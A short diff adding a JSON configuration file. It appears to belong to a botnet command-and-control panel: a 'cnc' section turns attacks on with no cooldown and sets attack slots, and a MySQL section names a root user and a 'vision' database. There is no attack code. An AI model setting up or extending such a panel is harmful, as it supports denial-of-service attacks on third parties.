@@ -1,0 +1,15 @@
+{
+	"cnc": {
+		"port": "2222",
+		"api_port": "7575",
+		"attacks_enabled": true,
+		"global_cooldown": 0,
+		"global_slots": 3
+	},
+	"mysql": {
+		"db_user": "root",
+		"db_pass": "CHANGE_ME",
+		"db_host": "localhost",
+		"db_name": "vision"
+	}
+}
